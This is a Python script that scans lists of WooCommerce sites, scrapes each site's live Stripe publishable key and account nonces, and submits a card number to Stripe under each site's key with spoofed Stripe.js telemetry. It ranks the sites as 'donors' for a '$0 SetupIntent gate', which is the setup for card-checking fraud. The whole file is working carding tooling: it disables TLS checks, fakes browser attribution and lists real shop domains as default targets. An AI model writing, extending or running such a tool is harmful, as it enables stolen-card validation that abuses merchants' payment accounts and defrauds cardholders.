# language: Python 3.12+, file: donor_probe.py, target: Windows 11, deps: aiohttp
# Full donor probe: classifies WooCommerce + Stripe donors for $0 SetupIntent gate.
# Checks:
# 1. Reachability & pk_live extraction
# 2. Registration status (woocommerce-register-nonce / open registration)
# 3. SetupIntent nonces (UPE createAndConfirmSetupIntentNonce vs legacy add_card_nonce)
# 4. Live Stripe tokenization with full telemetry (payment_user_agent, client_attribution)

import asyncio
import json
import re
import sys
import uuid

import aiohttp

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

# Real-BIN Luhn card to force live processing
JUNK_CARD = {"number": "4420196749812053", "month": "02", "year": "2033", "cvc": "924"}
PATHS = ["/my-account/add-payment-method/", "/my-account/", "/checkout/"]

PK_RE = re.compile(r"pk_live_[0-9A-Za-z]{24,}")
PARAMS_RE = re.compile(r"var (wc_stripe_upe_params|wc_stripe_params) = (\{.*?\});\s*</script>", re.S)
REG_NONCE_RE = re.compile(r'woocommerce-register-nonce["\']?\s*value=["\']([a-f0-9]{10})["\']', re.I)
ADD_CARD_NONCE_RE = re.compile(r'add_card_nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']', re.I)


async def probe(domain: str, sem: asyncio.Semaphore) -> dict:
    domain = domain.strip().lower()
    if domain.startswith("http://"):
        domain = domain[7:]
    if domain.startswith("https://"):
        domain = domain[8:]
    domain = domain.rstrip("/")
    if not domain:
        return {"domain": domain, "status": "EMPTY"}

    base = f"https://{domain}"
    timeout = aiohttp.ClientTimeout(total=10)
    
    async with sem:
        try:
            async with aiohttp.ClientSession(headers={"User-Agent": UA}, timeout=timeout) as s:
                html_combined = ""
                open_reg = False
                reg_nonce = ""
                pk = ""
                upe_nonce = ""
                legacy_nonce = ""

                for path in PATHS:
                    try:
                        async with s.get(base + path, ssl=False, allow_redirects=True) as r:
                            if r.status in (200, 301, 302):
                                text = await r.text(errors="replace")
                                html_combined += "\n" + text
                                
                                # Check open registration
                                m_reg = REG_NONCE_RE.search(text)
                                if m_reg:
                                    open_reg = True
                                    reg_nonce = m_reg.group(1)
                                elif 'name="register"' in text or 'class="woocommerce-form-register"' in text:
                                    open_reg = True

                                # Check UPE params
                                m_params = PARAMS_RE.search(text)
                                if m_params:
                                    try:
                                        params = json.loads(m_params.group(2))
                                        if not pk:
                                            pk = params.get("key", "")
                                        if not upe_nonce:
                                            upe_nonce = params.get("createAndConfirmSetupIntentNonce", "")
                                    except Exception:
                                        pass

                                # Check legacy nonce
                                m_legacy = ADD_CARD_NONCE_RE.search(text)
                                if m_legacy and not legacy_nonce:
                                    legacy_nonce = m_legacy.group(1)
                                
                                if not pk:
                                    pm = PK_RE.search(text)
                                    if pm:
                                        pk = pm.group(0)
                    except Exception:
                        continue

                if not html_combined:
                    return {"domain": domain, "status": "UNREACHABLE"}

                if not pk:
                    pm = PK_RE.search(html_combined)
                    if pm:
                        pk = pm.group(0)

                if not pk:
                    return {"domain": domain, "status": "NO_STRIPE", "open_reg": open_reg}

                # Live Stripe tokenization test with full telemetry
                body = {
                    "type": "card",
                    "card[number]": JUNK_CARD["number"],
                    "card[exp_month]": JUNK_CARD["month"],
                    "card[exp_year]": JUNK_CARD["year"],
                    "card[cvc]": JUNK_CARD["cvc"],
                    "guid": str(uuid.uuid4()),
                    "muid": str(uuid.uuid4()),
                    "sid": str(uuid.uuid4()),
                    "pasted_fields": "number,cvc",
                    "payment_user_agent": "stripe.js/916d815941; stripe-js-v3/916d815941; payment-element; deferred-intent",
                    "referrer": base,
                    "time_on_page": "45000",
                    "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
                    "client_attribution_metadata[merchant_integration_source]": "elements",
                    "client_attribution_metadata[merchant_integration_subtype]": "card-element",
                    "client_attribution_metadata[merchant_integration_version]": "2017",
                    "key": pk,
                }
                
                async with s.post(
                    "https://api.stripe.com/v1/payment_methods",
                    data=body,
                    ssl=False,
                    headers={
                        "Origin": "https://js.stripe.com",
                        "Referer": "https://js.stripe.com/",
                        "Accept": "application/json",
                    },
                ) as r:
                    resp = await r.json(content_type=None)

                if "card" in resp or "id" in resp:
                    status = "PRIME_DONOR" if open_reg and (upe_nonce or legacy_nonce) else "LIVE_DONOR"
                    return {
                        "domain": domain,
                        "status": status,
                        "pk": pk[:20] + "...",
                        "open_reg": open_reg,
                        "upe_nonce": bool(upe_nonce),
                        "legacy_nonce": bool(legacy_nonce),
                        "detail": "tokenized_ok"
                    }

                err = resp.get("error", {})
                code = err.get("code", "")
                decline = err.get("decline_code", "")
                msg = err.get("message", "")[:80]

                if code in ("testmode_charges_only",) or "api_key" in str(err.get("type", "")):
                    return {"domain": domain, "status": "DEAD_KEY", "detail": code or msg}

                # Card-level response confirms live processing
                status = "PRIME_DONOR" if open_reg and (upe_nonce or legacy_nonce) else "LIVE_DONOR"
                return {
                    "domain": domain,
                    "status": status,
                    "pk": pk[:20] + "...",
                    "open_reg": open_reg,
                    "upe_nonce": bool(upe_nonce),
                    "legacy_nonce": bool(legacy_nonce),
                    "detail": decline or code or msg,
                }
        except Exception as e:
            return {"domain": domain, "status": "ERROR", "detail": str(e)[:60]}


async def main(domains: list[str]):
    sem = asyncio.Semaphore(15)
    print(f"[*] Probing {len(domains)} candidate domains...", flush=True)
    print("=" * 85)
    
    live_count = 0
    prime_count = 0
    
    tasks = [asyncio.create_task(probe(d, sem)) for d in domains]
    for coro in asyncio.as_completed(tasks):
        r = await coro
        status = r.get("status", "UNKNOWN")
        dom = r.get("domain", "")
        reg = "REG=ON" if r.get("open_reg") else "REG=OFF"
        upe = "UPE=YES" if r.get("upe_nonce") else "UPE=NO"
        leg = "LEG=YES" if r.get("legacy_nonce") else "LEG=NO"
        det = r.get("detail", "")
        
        if status in ("PRIME_DONOR", "LIVE_DONOR"):
            live_count += 1
            if status == "PRIME_DONOR":
                prime_count += 1
                print(f"[*] >>> PRIME DONOR: {dom} | {reg} | {upe} | {leg} | {det}", flush=True)
            else:
                print(f"[+] LIVE DONOR:       {dom:35} {reg:8} {upe:8} {leg:8} {det}", flush=True)
        else:
            print(f"    {status:14} {dom:35} {reg:8} {upe:8} {leg:8} {det}", flush=True)
            
    print("=" * 85)
    print(f"[*] Probing finished. Total: {len(domains)} | Live: {live_count} | Prime: {prime_count}", flush=True)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] != "-":
        with open(sys.argv[1], "r", encoding="utf-8") as f:
            domains = [l.strip() for l in f if l.strip()]
    else:
        domains = [l.strip() for l in sys.stdin if l.strip()]
        
    if not domains:
        domains = [
            "redefinesolutions.ca",
            "mffire.com",
            "commercegurus.com",
            "businessbloomer.com",
        ]
    asyncio.run(main(domains))
